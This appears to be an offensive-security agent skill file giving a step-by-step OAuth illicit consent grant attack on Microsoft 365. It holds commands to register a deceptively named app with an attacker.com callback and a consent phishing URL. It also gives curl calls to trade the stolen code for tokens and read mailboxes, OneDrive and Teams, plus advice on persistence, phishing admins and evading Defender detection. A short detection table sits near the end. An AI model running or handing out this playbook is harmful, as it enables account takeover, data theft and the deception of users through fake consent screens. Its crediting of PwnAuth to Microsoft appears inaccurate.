---
name: offensive-illicit-consent
description: "OAuth illicit consent grant attack — register an attacker-controlled app in your own tenant, request high-privilege scopes, phish the target user (or admin) to grant consent, then use the granted permissions to access mailbox / OneDrive / Teams / Graph. Use as an alternative to credential phishing — relies on user clicking 'Accept' on an OAuth consent screen, which feels safer to many users than entering passwords."
---

# Illicit Consent Grant

Register an OAuth app in your tenant. Request scopes like `Mail.ReadWrite`, `Files.ReadWrite.All`, `User.Read.All`. Phish target to grant consent. Use the granted access.

## Setup

```bash
# 1. Register an app in YOUR tenant (or any AAD tenant you control)
# Azure portal: AAD → App Registrations → New
# Or via CLI:
az ad app create --display-name "Microsoft Document Sync" \
  --reply-urls "https://attacker.com/oauth/callback"

# 2. Configure required scopes
# Mail.ReadWrite, Files.ReadWrite.All, User.Read.All, etc.
# Some scopes admin-consent-only; pick scopes user can grant if targeting users
```

## Construct Consent URL

```
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
  client_id=<your-app-id>&
  response_type=code&
  redirect_uri=<callback>&
  scope=Mail.ReadWrite+Files.ReadWrite.All+offline_access&
  prompt=consent&
  state=<random>
```

Send this URL to target. They sign in, see the consent screen with your app's name + requested scopes. If they click "Accept," you receive a code.

## Receive Token

```bash
# Callback receives ?code=...
# Exchange for access + refresh tokens

curl -X POST 'https://login.microsoftonline.com/common/oauth2/v2.0/token' \
  -d 'client_id=<app-id>' \
  -d 'client_secret=<secret>' \
  -d 'code=<received-code>' \
  -d 'redirect_uri=<callback>' \
  -d 'grant_type=authorization_code'
```

Result: access + refresh tokens with the granted scopes.

## Use the Access

```bash
# Mailbox
curl -H "Authorization: Bearer $TOKEN" https://graph.microsoft.com/v1.0/me/messages
curl -H "Authorization: Bearer $TOKEN" https://graph.microsoft.com/v1.0/me/sendMail \
  -d '{"message": {...}}'

# Files
curl -H "Authorization: Bearer $TOKEN" https://graph.microsoft.com/v1.0/me/drive/root/children

# Teams (if scopes allow)
curl -H "Authorization: Bearer $TOKEN" https://graph.microsoft.com/v1.0/me/joinedTeams
```

## Persistence

Refresh tokens default to 90 days. Re-grant before expiration (don't need user re-consent within the same session).

## App Naming Strategy

Trick the consent screen by naming the app something legitimate-looking:

- "Microsoft Document Sync"
- "OneDrive Backup Service"
- "Teams Calendar Integration"
- "<Company> SSO Bridge"

Microsoft's consent UI shows the app name (your-controlled), publisher (your tenant — can be set to display "Verified" if you have publisher verification), and permissions requested.

## Admin Consent

For admin-only scopes (`Directory.ReadWrite.All`, `RoleManagement.ReadWrite.Directory`), only admins can grant. Phish admins specifically:

- Target users with admin roles
- Use `prompt=admin_consent` in the URL
- Admin grants consent for ALL users in tenant — far higher impact

## Microsoft Defender for Office 365 / "App Governance"

Modern tenants have:
- Risky app detection (flags apps requesting unusual scopes)
- Admin consent workflow (some scopes require admin approval before user-grant)
- App-only access reviews

Bypasses focus on:
- Common-sounding names that look legitimate
- Smaller scope sets (Mail.Read instead of Mail.ReadWrite, less alarm)
- Targeting users without admin consent workflow enabled

## Detection

| Signal | Defender View |
|---|---|
| User consent grant | AAD Audit Log: `Add app role assignment grant to user` |
| App-only access from new IP | Sign-in log shows service principal sign-in |
| Bulk Graph queries from app | App governance / sign-in audit |

Mature tenants alert on user-consent grants. Less mature ones don't.

## Engagement Cheatsheet

```bash
# 1. Register attacker app
az ad app create --display-name "<plausible-name>" --reply-urls "https://attacker/cb"

# 2. Configure required scopes (user-grantable for targeting users)

# 3. Send consent URL to target via authorized phishing

# 4. Receive code at callback; exchange for tokens

# 5. Use Graph API with received tokens

# 6. Document: app name, scopes granted, victim, data accessed
```

## Key References

- "Illicit Consent Grant" — Microsoft documentation
- "PwnAuth" (Microsoft, demonstrating the attack)
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/illicit-consent.md
